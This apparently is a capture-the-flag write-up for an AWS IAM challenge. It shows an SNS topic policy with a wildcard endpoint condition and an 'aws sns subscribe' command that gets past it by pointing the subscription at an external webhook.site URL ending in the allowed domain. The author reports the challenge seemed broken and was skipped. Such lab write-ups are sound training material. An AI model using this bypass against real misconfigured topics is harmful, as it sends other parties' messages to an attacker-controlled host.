# Challenge 3

## We got a message for you. Can you get it?
- https://bigiamchallenge.com/challenge/3

## IAM Policy
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```
## Solution

- At the time of solving & writing the solution I found this challenge is kind of broken as our endpoint could not recieve the SNS confirmation message in our webhook

```bash
 aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint https://webhook.site/e81ba3c4-f37e-4bb6-9041-bf194f97550b/@tbic.wiz.io
```
```json
{
    "SubscriptionArn": "pending confirmation"
}
```
## Note

I could not solve the full challenge as I believe the part of the challenge is broken. I read some oneline writeup and verified my process is correct but the request is not triggered. To move on to the next part of the challenge I used a flag to skip this challenge and move to the next.
